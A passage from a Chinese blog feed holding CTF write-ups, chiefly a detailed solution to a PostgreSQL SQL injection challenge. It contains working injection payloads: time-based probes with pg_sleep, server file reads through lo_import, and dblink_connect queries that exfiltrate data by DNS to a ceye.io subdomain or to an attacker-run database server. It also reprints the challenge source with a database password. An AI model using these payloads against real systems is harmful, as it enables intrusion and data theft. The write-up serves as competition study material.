src="/article/2021gongcesai/QQ%E5%9B%BE%E7%89%8720210205171005.jpg" class="" title="QQ图片20210205171005" loading="lazy"><p>参考链接：<a href="http://bobao.360.cn/ctf/learning/136.html">http://bobao.360.cn/ctf/learning/136.html</a></p><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="DTMF"><a href="#DTMF" class="headerlink" title="DTMF"></a>DTMF</h3><p>电话音，网上有在线识别网站</p><p><a href="http://dialabc.com/sound/detect/index.html">http://dialabc.com/sound/detect/index.html</a></p><p>格式要求<code>.wav</code>，先用ffmpeg转格式</p><img src="/article/2021gongcesai/image-20210205140704301.png" class="" title="image-20210205140704301" loading="lazy"><p>再放上去识别</p><img src="/article/2021gongcesai/image-20210205140736060.png" class="" title="image-20210205140736060" loading="lazy"><pre class="language-none"><code class="language-none">CnHongKe&#123;A18D3B18C*231#&#125;</code></pre><hr><h3 id="HalfQR"><a href="#HalfQR" class="headerlink" title="HalfQR"></a>HalfQR</h3><p>二维码修复网站 <a href="https://merricx.github.io/qrazybox/">https://merricx.github.io/qrazybox/</a></p><img src="/article/2021gongcesai/qr1.jpg" class="" title="QR" loading="lazy"><p>手 撸</p><img src="/article/2021gongcesai/image-20210205165950957.png" class="" title="image-20210205165950957" loading="lazy"><img src="/article/2021gongcesai/image-20210205170018477.png" class="" title="image-20210205170018477" loading="lazy"><p>然后</p><img src="/article/2021gongcesai/image-20210205165843064.png" class="" title="image-20210205165843064" loading="lazy"><p>最后</p><pre class="language-none"><code class="language-none">CnHongKe&#123;f88ae38f450e76d3c92410e3650df67&#125;</code></pre><p>也可以手算…毕竟数据域的半边东西给了</p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这些题目作为线下赛题目是难了，毕竟去年有过一次线下，线上赛就不说了，神仙乱斗2333，还不用交WP，希望主办方能完善赛制，首先赛后都不用交WP是挺离谱的，其次题目的质量…其实还行，但作为线上还是简单了，一篇wp却写不出多少东西，通篇八题仅仅一千字，可能是题目问题，也有一部分我的问题，总之多多总结吧。</p><img src="/article/2021gongcesai/QQ%E5%9B%BE%E7%89%8720210205185049.jpg" class="" width="233" loading="lazy"><p>懂的都懂2333</p><p>还是有些收获的，提前祝大家新年快乐！</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋杯2021新春欢乐赛一道题——按F注入 对pgsql的研究</title>
      <link href="article/cqb2021/"/>
      <url>article/cqb2021/</url>
      
        <content type="html"><![CDATA[<p>只做了一道题，按F注入，研究了pgsql，算个小笔记，不能算研究性文章</p><span id="more"></span><h2 id="按F注入"><a href="#按F注入" class="headerlink" title="按F注入"></a>按F注入</h2><p>打开题目看到只能手机访问，看到了源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>body<span class="token operator">></span>只有手机才能访问<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">function</span> <span class="token function-definition function">is_mobile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token variable">$clientkeywords</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token string single-quoted-string">'nokia'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'sony'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'ericsson'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'mot'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'samsung'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'htc'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'sgh'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'lg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'sharp'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'sie-'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'philips'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'panasonic'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'alcatel'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'lenovo'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'iphone'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'ipod'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'blackberry'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'meizu'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'android'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'netfront'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'symbian'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'ucweb'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'windowsce'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'palm'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'operamini'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'operamobi'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'openwave'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'nexusone'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'cldc'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'midp'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'wap'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'mobile'</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token comment">//从HTTP_USER_AGENT中查找手机浏览器的关键字--></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/("</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$clientkeywords</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">")/i"</span><span class="token punctuation">,</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span></code></pre><p>于是在HEADER里添加<code>User-Agent: mobile</code>即可</p><img src="/article/cqb2021/image-20210201185004667.png" class="" title="UA" loading="lazy"><p>点击任何都是JavaScript脚本<code>javascript:alert(&#39;投票成功,恭喜您获得奶奶一个&#39;)</code>，底部发现了提示</p><p><code>&lt;!--&lt;a href=&quot;?f=1&quot;&gt;我选择按下F进入TK&lt;/a&gt;--&gt;</code></p><p>于是访问<code>./?f=1</code>没有变化，猜测SSRF或SQL注入，但是没有其他提示。</p><p>访问<code>./?f=1&#39;</code>发现有弹窗</p><img src="/article/cqb2021/image-20210201185510275.png" class="" title="小哥哥" loading="lazy"><p>fuzz一波，发现<code>#</code>和<code>%23</code>都会一直弹窗，而使用<code>--</code>注释即<code>?f=1&#39; --</code>却不会弹窗，搜索一波发现是 PostgreSQL ，猜测<strong>语法错误</strong>或者<strong>报错</strong>会有弹窗</p><p>甚至搜到了原题，赛后向 <a href="https://ha1c9on.top/">@HA1C9ON</a> 大佬请教得知，当时比赛的WP是有错误的，后续会道来。</p><p>测试一下发现<code>./?f=</code></p><blockquote><ul><li><code>gyy</code>，没有警告</li><li><code>gyy&#39;</code>，警告</li><li><code>gyy&#39; and 1=0 --</code>，没有警告</li><li><code>gyy&#39; and 1=1 --</code>，没有警告</li><li><code>gyy&#39; order by 1 --</code>，没有警告</li><li><code>gyy&#39; order by 2 --</code>，没有警告</li><li><code>gyy&#39; order by 3 --</code>， 警告</li><li><code>gyy&#39; union select 1,2 --</code>， 警告</li><li><code>gyy&#39; union select 1,&#39;2&#39; --</code>，没有警告</li><li><code>gyy&#39; union select 1,pg_sleep(10) --</code>， 警告</li><li><code>gyy&#39; union select 1,cast(pg_sleep(10) as text) --</code>，没有警告（有延迟！）</li><li><code>gyy&#39; union select 1,&#39;2&#39; from pg_database --</code>，没有警告</li><li><code>gyy&#39; union select 1,&#39;2&#39; from gyy --</code>， 警告</li><li><code>gyy&#39; union select 1,chr(65) --</code>，没有警告</li><li><code>gyy&#39; union select 1,chr(-65) --</code>，没有警告</li></ul></blockquote><p>由order by可以判断此处列数为2，由union select可以判断1处对应列为数值类型，2处对应非数值类型</p><h3 id="方法一：延时注入"><a href="#方法一：延时注入" class="headerlink" title="方法一：延时注入"></a>方法一：延时注入</h3><p> postgrest数据库中的延时函数有<code>pg_sleep()</code>&#x2F;<code>pg_sleep_for()</code>&#x2F;<code>pg_sleep_until()</code></p><p>查阅资料得知：</p><blockquote><p>pg_sleep(seconds)<br>pg_sleep_for(interval)<br>pg_sleep_until(timestamp with time zone)</p><p>pg_sleep让当前的会话进程休眠seconds 秒以后再执行。seconds是一个double precision 类型的值，所以可以指定带小数的秒数。<br>pg_sleep_for 对于指定为interval的较长睡眠时间是一个便利函数。<br>pg_sleep_until在需要特定唤醒时间时比较便利。</p><p>SELECT pg_sleep(1.5);<br>SELECT pg_sleep_for(‘5 minutes’);<br>SELECT pg_sleep_until(‘tomorrow 03:00’);</p></blockquote><p>当时比赛脚本参考 <a href="https://github.com/w181496/CTF/blob/master/fbctf2019/hr_admin_module/exp.py">balsn</a></p><p>这里不做阐述，因为最终得出结果</p><pre class="language-none"><code class="language-none">version: (Debian 11.2-1.pgdg90+1)current_db: docker_dbcurrent_schema: publictable of public: searchescolumns of searches: id,searchcounts of searches:0</code></pre><p><code>searches</code>表为空，所以本题应读取文件</p><h3 id="方式二：信息带外"><a href="#方式二：信息带外" class="headerlink" title="方式二：信息带外"></a>方式二：信息带外</h3><p>利用DNSlog方式</p><p>在PostgreSQL中，存在dblink模块，可以外联数据库或者当前数据库，dblink_connect同时会对host进行DNS查询，利用查询给定DNS的子域名，再查DNS解析记录即可获取传递的信息，这里用<a href="http://ceye.io/">ceye</a>来记录</p><p>首先看看dblink模块有没有开启</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;1&#39; union select 1,(select dblink_connect(&#39;&#39;)) --</code></pre><p>没有报错，说明可以操作继续尝试</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;1&#39; union select 1,(select dblink_connect(&#39;host&#x3D;&#39; || (SELECT current_database()) || &#39;.xxxx.ceye.io user&#x3D;a password&#x3D;a dbname&#x3D;a&#39;)) --</code></pre><p>xxxx是ceye个人的 Identifier ，可见成功返回了当前数据库名</p><img src="/article/cqb2021/image-20210201195343606.png" class="" title="ceye" loading="lazy"><p>原理是通过<code>.</code>连接，让pgsql去解析host即给定DNS的子域名，从而带出信息。顺着这个方法可以带出来部分信息</p><p>接着就要考虑如何文件包含了，在这里原WP写的很清楚</p><blockquote><p>我们可能确实需要从中窃取数据<code>/var/lib/postgresql/data/secret</code>。不幸的是，如果我们尝试使用<code>pg_read_file</code>或<code>pg_read_binary_file</code>读取文件，则不会获得传入连接，因此当前用户可能无权使用这些功能。</p><p>读取文件的替代方法是使用<a href="https://www.postgresql.org/docs/11/lo-funcs.html">大对象</a>。我们可以用来<code>lo_import</code>将文件的内容加载到<code>pg_largeobject</code>目录中。如果查询成功，我们将获得对象的<code>oid</code>。</p></blockquote><p> 当前用户为docker，不够权限执行系统管理员才能执行的函数<code>pg_read_file()</code>, <code>pg_ls_dir()</code> or <code>pg_stat_file()</code> ，也不方便写udf，没有写权限。</p><p>下面截取原WP的部分内容：</p><blockquote><p>碰到这种情况也就是需要绕过的时候的做法，一般都是谷歌百度，然后阅读文档，另外可以自己起一个环境去搜索相关的函数。例如在这里，balsn的做法是另外起一个环境：</p><pre class="language-text" data-language="text"><code class="language-text">SELECT proname FROM pg_proc WHERE proname like '%file%';   查询所有带有file的函数pg_stat_get_db_temp_files pg_walfile_name_offset pg_walfile_name pg_rotate_logfile_old pg_read_file_old pg_read_file pg_read_file pg_read_file pg_read_binary_file pg_read_binary_file pg_read_binary_file pg_stat_file pg_stat_file pg_relation_filenode pg_filenode_relation pg_relation_filepath pg_show_all_file_settings pg_hba_file_rules pg_rotate_logfile pg_current_logfile pg_current_logfile</code></pre><p>但是这些函数都似乎没起作用</p><pre class="language-text" data-language="text"><code class="language-text">SELECT proname FROM pg_proc WHERE proname like '%read%';   查阅带有read的函数loread pg_stat_get_db_blk_read_time pg_read_file_old pg_read_file pg_read_binary_file</code></pre><p>可以看到第一个方法，通过查阅文档（学会阅读文档很重要！）</p><p>loread是面向SQL的大对象函数，比如<code>lo_from_bytea</code>，<code>lo_put</code>，<code>lo_get</code>，<code>lo_creat</code>, <code>lo_create</code>,</p><pre class="language-none"><code class="language-none">lo_unlink&#96;， &#96;lo_import&#96;和 &#96;lo_export</code></pre><p> 服务器端的<code>lo_import</code>和 <code>lo_export</code>函数和客户端的那几个有着显著的不同。 这两个函数在服务器的文件系统里读写文件， 使用数据库所有者的权限进行。 因此，只有超级用户才能使用他们。相比之下，客户端的输入和输出函数在客户端的文件系统里读写文件， 使用客户端程序的权限。客户端函数不需要超级用户权限。<br><code>lo_read</code>和<code>lo_write</code>的功能通过服务器端调用可用， 但是服务器端函数名不同于客户端接口，因为他们不包含下划线。你必须作为<code>loread</code>和<code>lowrite</code> 调用这些函数。 </p><p>在将服务器端lo_import和lo_export函数授权给非超级用户时需要仔细考虑安全隐患。 具有此类权限的恶意用户可以轻松地将其变为超级用户（例如，通过重写服务器配置文件），或者可以攻击服务器的其余文件系统，而无需获取数据库超级用户权限。 因此，对这两个函数的权限授予必须谨慎。</p></blockquote><p>回到题目中来，lo_import方法可以读取文件为postgres对象，原准备利用lo_export写文件，可是应该是没有权限</p><p>我们先包含<code>index.php</code>看看源码</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;gyy&#39; union select (select lo_import(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;)),&#39;2&#39; --</code></pre><p><strong>请注意！请注意！请注意！</strong>错误写法：</p><p><code>./?f=gyy&#39; union select 1,(select dblink_connect(&#39;host=&#39; || (select lo_import(&#39;/var/www/html/index.php&#39;)) || &#39;.xxxx.ceye.io user=a password=a dbname=a&#39;)) --</code></p><p>表面上确实返回了oid</p><img src="/article/cqb2021/image-20210201200309775.png" class="" title="DNSlogoid" loading="lazy"><p>但是，在 dblink下 lo_import只是在vps上的 生效，并没有实际包含，在方式三会有实验证明，在最后有对注入点的解释。</p><p>然后接下来发现，这里利用DNSlog进行信息外带还有的问题是要遵循DNS协议，最大位数不超过63位，且不能有任何特殊符号及空格回车之类的，只能用<code>substring</code>函数一段一段截取，还得<code>replace</code>替换字符，可以完成但非常麻烦，不推荐使用。</p><h3 id="方式三：数据库外联"><a href="#方式三：数据库外联" class="headerlink" title="方式三：数据库外联"></a>方式三：数据库外联</h3><p>为了更好理解，下面先进行实验测试，dblink下 lo_import只是在vps上的 生效，并没有实际包含，详情可见如下</p><hr><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>服务器或本地起一个pgsql服务，可以安装，也可以docker起一个记得开端口映射，然后将其中的<code>postgresql.conf</code>中设置<code>listen_addresses = &#39;*&#39;</code>以监听。然后运行tcpdump监听端口流量</p><pre class="language-none"><code class="language-none">sudo tcpdump -nX -i eth0 port 5432</code></pre><p>默认端口为5432</p><p>dblink下包含文件</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;postgres password&#x3D;postgres dbname&#x3D;@&#39;|| (select lo_import(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;)) )) --</code></pre><img src="/article/cqb2021/image-20210201215153531.png" class="" title="oid" loading="lazy"><p>返回oid16438，我们读取一下所有oid列表看一下</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;@&#39; || (SELECT string_agg(cast(oid as text), &#39;,&#39;) FROM pg_largeobject_metadata) || &#39; password&#x3D;postgres dbname&#x3D;postgres&#39;)) --</code></pre><p>没有报错，同时，<strong>没有任何数据返回</strong></p><p>而我们直接包含<code>index.php</code>试一下</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select (select lo_import(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;)),&#39;2&#39; --</code></pre><p>没有报错，再查一下oid列表</p><img src="/article/cqb2021/image-20210201220913327.png" class="" title="oid2" loading="lazy"><p>有数据返回，同时可见16439和16440，而16438并没有在列表中，读取16438数据没有返回，读取16439与16440正常返回</p><p>可见dblink下lo_import在本地是不生效的</p><hr><p>这是原WP里的错误，原因在于其flag文件本身就已经包含在大对象里，所以直接就可查询，而dblink状态下并没有生效，算是这次比赛这道题目的最大收获吧。</p><p>如实验所示，流程如下，IP记得替换成自己的</p><p>首先起服务如实验中所示</p><p>先将<code>index.php</code>包含进来，看看有没有线索</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select (SELECT lo_import(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;)),&#39;2&#39; --</code></pre><p>然后读取全部oid列表</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;@&#39; || (SELECT string_agg(cast(oid as text), &#39;,&#39;) FROM pg_largeobject_metadata) || &#39; password&#x3D;postgres dbname&#x3D;postgres&#39;)) --</code></pre><img src="/article/cqb2021/image-20210202011754628.png" class="" title="oid3" loading="lazy"><p>（多按几下就会有多个oid，见谅…）</p><p>然后读<code>index.php</code>的oid读取数据，这里可以直接读，lo_get数据转码为UTF-8，然后替换换行符(chr(10))再替换空格(chr(32))即可明文读取</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;@&#39; || (SELECT replace(replace(substring(convert_from(lo_get(16440),&#39;utf8&#39;),1,900),chr(10),&#39;&#39;),chr(32),&#39;&#39;)) || &#39; password&#x3D;postgres dbname&#x3D;postgres&#39;)) --</code></pre><img src="/article/cqb2021/image-20210202004121305.png" class="" title="index" loading="lazy"><p>当然看不清可以base64读取自己转</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;postgres password&#x3D;postgres dbname&#x3D;@&#39;||(SELECT replace(substring(encode(lo_get(16440),&#39;base64&#39;),1,900),chr(10),&#39;&#39;)))) --</code></pre><img src="/article/cqb2021/image-20210201200655345.png" class="" title="base64index" loading="lazy"><p>得到<code>index.php</code>源码</p><pre class="language-none"><code class="language-none">&lt;?phperror_reporting(0);session_start();function is_mobile()&#123;    if (isset ($_SERVER[&#39;HTTP_USER_AGENT&#39;])) &#123;        $clientkeywords &#x3D; array(            &#39;nokia&#39;,&#39;sony&#39;,&#39;ericsson&#39;,&#39;mot&#39;,&#39;samsung&#39;,&#39;htc&#39;,&#39;sgh&#39;,&#39;lg&#39;,&#39;sharp&#39;,&#39;sie-&#39;,&#39;philips&#39;,&#39;panasonic&#39;,&#39;alcatel&#39;,&#39;lenovo&#39;,&#39;iphone&#39;,&#39;ipod&#39;,&#39;blackberry&#39;,&#39;meizu&#39;,&#39;android&#39;,&#39;netfront&#39;,&#39;symbian&#39;,&#39;ucweb&#39;,&#39;windowsce&#39;,&#39;palm&#39;,&#39;operamini&#39;,&#39;operamobi&#39;,&#39;openwave&#39;,&#39;nexusone&#39;,&#39;cldc&#39;,&#39;midp&#39;,&#39;wap&#39;,&#39;mobile&#39;        );        if (preg_match(&quot;&#x2F;(&quot; . implode(&#39;|&#39;, $clientkeywords) . &quot;)&#x2F;i&quot;, strtolower($_SERVER[&#39;HTTP_USER_AGENT&#39;]))) &#123;            return true;        &#125;    &#125;    return false;&#125;if (!is_mobile()) &#123;    die(&quot;&lt;!--function is_mobile()&#123;--&gt;&lt;!--if (isset (\$_SERVER[&#39;HTTP_USER_AGENT&#39;])) &#123;--&gt;&lt;!--\$clientkeywords &#x3D; array(--&gt;&lt;!--&#39;nokia&#39;,&#39;sony&#39;,&#39;ericsson&#39;,&#39;mot&#39;,&#39;samsung&#39;,&#39;htc&#39;,&#39;sgh&#39;,&#39;lg&#39;,&#39;sharp&#39;,&#39;sie-&#39;,&#39;philips&#39;,&#39;panasonic&#39;,&#39;alcatel&#39;,&#39;lenovo&#39;,&#39;iphone&#39;,&#39;ipod&#39;,&#39;blackberry&#39;,&#39;meizu&#39;,&#39;android&#39;,&#39;netfront&#39;,&#39;symbian&#39;,&#39;ucweb&#39;,&#39;windowsce&#39;,&#39;palm&#39;,&#39;operamini&#39;,&#39;operamobi&#39;,&#39;openwave&#39;,&#39;nexusone&#39;,&#39;cldc&#39;,&#39;midp&#39;,&#39;wap&#39;,&#39;mobile&#39;--&gt;&lt;!--);--&gt;&lt;!--&#x2F;&#x2F;HTTP_USER_AGENT¸­--&gt;&lt;!--if (preg_match(\&quot;&#x2F;(\&quot; . implode(&#39;|&#39;, \$clientkeywords) . \&quot;)&#x2F;i\&quot;, strtolower(\$_SERVER[&#39;HTTP_USER_AGENT&#39;]))) &#123;--&gt;&lt;!--return true;--&gt;&lt;!--&#125;--&gt;&lt;!--&#125;--&gt;&lt;!--return false;--&gt;&lt;!--&#125;--&gt;&quot;);&#125;$user_input &#x3D; $_GET[&#39;f&#39;];if ($_SESSION[&quot;sql_injection&quot;]) &#123;    $user_input2 &#x3D; $_SESSION[&quot;sql_injection&quot;];    if(preg_match(&quot;&#x2F;dblink&#x2F;i&quot;, $user_input2)) &#123;        if(preg_match(&quot;&#x2F;host&#x2F;i&quot;, $user_input2)) &#123;            $limit &#x3D; 1;        &#125;        $user_input2 &#x3D; preg_replace(&#39;&#x2F;(connect_timeout ?&#x3D;)&#x2F;i&#39;, &#39;&#39;, $user_input);        $user_input2 &#x3D; preg_replace(&#39;&#x2F;(host&#x3D;)&#x2F;i&#39;, &#39;connect_timeout&#x3D;2 host&#x3D;&#39;, $user_input);&#x2F;&#x2F;        hack for tcpdump ,only dns        $user_input2 &#x3D; preg_replace(&#39;&#x2F;(user&#x3D;\&#39;)&#x2F;i&#39;, &#39;hack&#39;, $user_input2);        $user_input2 &#x3D; preg_replace(&#39;&#x2F;(password&#x3D;\&#39;)&#x2F;i&#39;, &#39;hack&#39;, $user_input2);    &#125;    $dbconn &#x3D; pg_connect(&quot;host&#x3D;127.0.0.1 port&#x3D;5432 dbname&#x3D;docker_db user&#x3D;docker password&#x3D;aYRr45lTgN9I9LJcjcr0&quot;);    pg_query($dbconn, &quot;SET statement_timeout TO 0&quot;);    pg_query($dbconn, &quot;SET idle_in_transaction_session_timeout TO 20&quot;);    pg_query($dbconn, &quot;SET lock_timeout TO 20&quot;);    $sql &#x3D; &quot;SELECT * FROM searches WHERE search &#x3D; &#39;&quot;.$user_input2.&quot;&#39;&quot;;    try &#123;        if (pg_prepare($dbconn, &quot;my_query&quot;, $sql)) &#123;            $start &#x3D; microtime(true);            pg_send_query($dbconn, $sql);            $error &#x3D; 0;        &#125; else &#123;            pg_send_query($dbconn, &quot;SELECT id FROM searches WHERE search &#x3D; &#39;0&#39;&quot;);            $error &#x3D; 1;        &#125;    &#125; catch (Exception $e) &#123;        &#x2F;&#x2F; Do nothing    &#125;&#125;$_SESSION[&quot;sql_injection&quot;] &#x3D; $user_input;?&gt;</code></pre><p>好像没啥，根据 <code>hint：不是所有sql都叫PostgreSQL；flag在web目录下的某个文件里。</code> 确定，关键文件肯定在这里，于是继续尝试，读到了<code>.hatccess</code>，包含一下，再读一下</p><p><code>.htaccess</code></p><pre class="language-none"><code class="language-none">&lt;FilesMatch &quot;pushF1n4AnK&quot;&gt;  SetHandler application&#x2F;x-httpd-php&lt;&#x2F;FilesMatch&gt;AddType image&#x2F;jpeg .tank</code></pre><p>可疑文件<code>pushF1n4AnK</code>，读一下</p><img src="/article/cqb2021/image-20210201201204964.png" class="" title="flag" loading="lazy"><p>至此题目结束了</p><p>最后说一下注入点的问题</p><h3 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h3><h4 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a>DNSlog</h4><p>对于DNSlog，注入点在host，即<code>... host=&#39;|| (query) ||&#39;.xxxx.ceye.io ...</code>，上面已解释过</p><h4 id="数据库外联"><a href="#数据库外联" class="headerlink" title="数据库外联"></a>数据库外联</h4><p>注入点在明文传输的部分，即<code>... user=&#39;|| (query) ||&#39;...</code>和<code>... dbname=&#39;||(query) &#39;</code>最后不需要<code>|</code>连接符，因为没有东西加了会报错</p><p>举例，例如在获取所有大对象oid时，在<code>user</code>处注，如图所示</p><img src="/article/cqb2021/image-20210202021430433.png" class="" title="inject" loading="lazy"><pre class="language-none"><code class="language-none">user.xxxx.database.postgres</code></pre><p>即<code>user</code>和<code>dbname</code>处都是明文传输的都可以注，而password不行</p><h2 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h2><p>感谢 <a href="https://ha1c9on.top/">@HA1C9ON</a> 大佬的教导，感谢 @egg 师傅的指导，以及和 @R1chm0nd 师傅赛后讨论指正payload中<code>user=&#39; || (query) || &#39;</code>的<code>|</code>或符合其实是连接符，学习了。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md">https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md</a></p><p><a href="https://zhuanlan.zhihu.com/p/78908281?from_voters_page=true">https://zhuanlan.zhihu.com/p/78908281?from_voters_page=true</a></p><p><a href="https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/dblink-lo_import-data-exfiltration">https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/dblink-lo_import-data-exfiltration</a></p><p><a href="https://balsn.tw/ctf_writeup/20190603-facebookctf/">https://balsn.tw/ctf_writeup/20190603-facebookctf/</a></p><p><a href="https://ha1c9on.top/2021/01/31/2021-cqb-write-up/">https://ha1c9on.top/2021/01/31/2021-cqb-write-up/</a> la佬博客，希望能和师傅一样强，能和师傅换友链</p><p><a href="https://blog.pentesteracademy.com/postgresql-udf-command-execution-372f0c68cfed">https://blog.pentesteracademy.com/postgresql-udf-command-execution-372f0c68cfed</a> (写udf的，没用上2333)</p><p><a href="http://www.postgres.cn/docs/9.4/functions-datetime.html#FUNCTIONS-DATETIME-DELAY">http://www.postgres.cn/docs/9.4/functions-datetime.html#FUNCTIONS-DATETIME-DELAY</a></p><p><a href="https://www.postgresql.org/docs/11/dblink.html">https://www.postgresql.org/docs/11/dblink.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DJBCTF2021</title>
      <link href="article/djbctf2021/"/>
      <url>article/djbctf2021/</url>
      
